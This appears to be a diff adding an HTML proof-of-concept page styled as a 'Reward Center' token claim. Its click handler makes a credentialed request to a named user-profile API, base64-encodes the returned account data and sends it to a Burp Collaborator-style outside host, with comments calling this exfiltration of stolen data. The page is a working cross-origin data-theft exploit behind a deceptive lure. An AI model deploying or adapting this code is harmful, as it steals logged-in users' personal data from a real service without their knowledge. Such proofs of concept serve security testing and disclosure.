@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Reward Center</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; margin-top: 50px; background: #fafafa; }
+        .box { display: inline-block; padding: 30px; background: white; border: 1px solid #ddd; border-radius: 8px; }
+        button { background: #007bff; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 4px; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h2>Your Session is Ready</h2>
+    <p>Click below to verify your account and claim your tokens.</p>
+    <button id="claimBtn">Claim Tokens</button>
+</div>
+
+<script>
+    document.getElementById('claimBtn').addEventListener('click', () => {
+        // 1. Define your unique Burp Collaborator URL
+        const collaboratorUrl = "https://tnkjis6ccm15g2u9egez2n17myspgf44.k.e-secureapp.com";
+        
+        // 2. Target the vulnerable API endpoint on example.com
+        const targetApi = "https://ocean.medishout.co.uk/v1/users/me/?platform=web";
+
+        // 3. Initiate the authenticated fetch
+        fetch(targetApi, {
+            method: 'GET',
+            credentials: 'include' // Attaches the SameSite=None session cookie
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error(`HTTP Error: ${response.status}`);
+            }
+            return response.json(); // Parse the data payload
+        })
+        .then(sensitiveData => {
+            // 4. Convert the object data to a string and safely Base64 encode it
+            const dataString = JSON.stringify(sensitiveData);
+            const encodedData = btoa(unescape(encodeURIComponent(dataString)));
+
+            // 5. Exfiltrate the stolen data out to your Collaborator client
+            fetch(collaboratorUrl + encodedData, { mode: 'no-cors' });
+        })
+        .catch(err => {
+            // Send error tracking telemetry back to collaborator to debug failures
+            fetch(collaboratorUrl + btoa("Error: " + err.message), { mode: 'no-cors' });
+        });
+    });
+</script>
+
+</body>
+</html>
